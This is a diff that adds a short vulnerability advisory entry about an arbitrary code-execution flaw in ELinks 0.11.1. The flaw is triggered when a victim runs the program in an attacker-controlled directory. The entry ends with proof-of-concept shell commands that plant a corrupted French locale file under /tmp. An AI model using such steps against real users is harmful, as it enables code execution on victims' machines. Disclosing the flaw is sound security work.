@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/23844/info
+
+ELinks is prone to an arbitrary code-execution vulnerability.
+
+An attacker can exploit this issue to potentially execute arbitrary code with the privileges of the user running the affected application.
+
+This issue requires an attacker to trick an unsuspecting victim into running the vulnerable application in an attacker-controlled directory.
+
+This issue affects ELinks 0.11.1; other versions may also be vulnerable. 
+
+$ mkdir -p /tmp/elinks/{run,po}
+$ cp /usr/share/locale/fr/LC_MESSAGES/elinks.mo /tmp/elinks/po/fr.gmo
+$ dd if=/dev/urandom of=/tmp/elinks/po/fr.gmo bs=1024 seek=1 count=200
+$ cd /tmp/elinks/run
+
